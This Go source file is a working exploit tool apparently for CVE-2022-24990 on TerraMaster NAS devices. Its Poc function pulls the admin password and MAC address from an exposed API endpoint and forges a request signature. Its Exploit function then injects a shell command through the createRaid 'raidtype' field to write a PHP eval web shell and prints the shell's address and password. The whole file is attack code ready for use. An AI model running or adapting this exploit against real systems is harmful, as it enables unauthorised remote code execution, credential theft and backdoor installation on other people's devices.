package c_2022_24990

import (
	"crypto/md5"
	"fmt"
	"github.com/fatih/color"
	"github.com/imroc/req/v3"
	"math/rand"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

type WebData struct {
	Pwd       string
	Mac       string
	Timestamp string
	Signature string
}

var bytes []byte = []byte("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

var (
	webData WebData
	urlBase string
)

func genSignature(key string) string {
	id := key + strconv.FormatInt(time.Now().Unix(), 10)
	signature := fmt.Sprintf("%x", md5.Sum([]byte(id)))
	return signature
}

func randString(n int) string {
	result := make([]byte, n)
	for i := 0; i < n; i++ {
		result[i] = bytes[rand.Int31()%62]
	}
	return string(result)
}

func Poc(urlInput string) {
	if strings.HasSuffix(urlInput, `/`) {
		urlInput = strings.TrimRight(urlInput, `/`)
	}
	urlBase = urlInput
	urlIndex := urlBase + "/module/api.php?mobile/webNasIPS"
	client := req.C()
	client.SetCommonHeader("User-Agent", "TNAS")
	client.EnableForceHTTP1()
	client.EnableInsecureSkipVerify()
	// 设置代理
	// client.SetProxyURL("http://127.0.0.1:11223")
	resp, err := client.R().Get(urlIndex)
	if err != nil {
		color.Red("[-] Connection err, please check the network.")
		os.Exit(0)
	}
	respString := resp.String()
	if resp.IsSuccess() && strings.Contains(respString, `webNasIPS successful`) && strings.Contains(respString, `mac`) {
		color.Green("[+] Target: %s is vulnerable!", urlBase)
		webData.Pwd = strings.Split(strings.Split(respString, `PWD:`)[1], `\n`)[0]
		webData.Mac = strings.Split(strings.Split(respString, `mac\":\"`)[1], `\"},`)[0]
		webData.Timestamp = strconv.FormatInt(time.Now().Unix(), 10)
		webData.Signature = genSignature(strings.Replace(webData.Mac[len(webData.Mac)-9:], `:`, ``, -1))
	} else {
		color.Red("[-] Target: %s is not vulnerable!", urlBase)
	}
}

func Exploit(urlInput string) {
	Poc(urlInput)
	color.Green("[+] Start Upload WebShell...")
	urlIndex := urlBase + `/module/api.php?mobile/createRaid`
	webShellName := randString(10) + `.php`
	webShellPass := randString(10)
	command := fmt.Sprintf(`;echo '<?php @eval($_POST["%s"]);?>'>%s`, webShellPass, webShellName)
	payload := fmt.Sprintf(`raidtype=%s&diskstring=XXXX`, url.QueryEscape(command))
	client := req.C()
	customHeader := map[string]string{
		"User-Agent":                "TNAS",
		"Authorization":             webData.Pwd,
		"Signature":                 webData.Signature,
		"Timestamp":                 webData.Timestamp,
		"Upgrade-Insecure-Requests": "1",
		"Content-Type":              "application/x-www-form-urlencoded",
	}
	client.EnableForceHTTP1()
	client.EnableInsecureSkipVerify()
	// client.SetProxyURL("http://127.0.0.1:8080")

	resp, err := client.R().SetContentType("application/x-www-form-urlencoded").SetHeaders(customHeader).SetBody(payload).Post(urlIndex)
	if err != nil {
		color.Red("[-] Upload WebShell err, please check the network.")
		os.Exit(0)
	}
	if resp.IsSuccess() && strings.Contains(resp.String(), `true`) && strings.Contains(resp.String(), `createRaid successful`) {
		color.Green("[+] WebShell upload success")
		color.Green("[+] WebShell Address: %s/module/%s", urlBase, webShellName)
		color.Green("[+] WebShell Password: %s", webShellPass)
	} else {
		color.Red("[-] Upload WebShell err")
	}
}
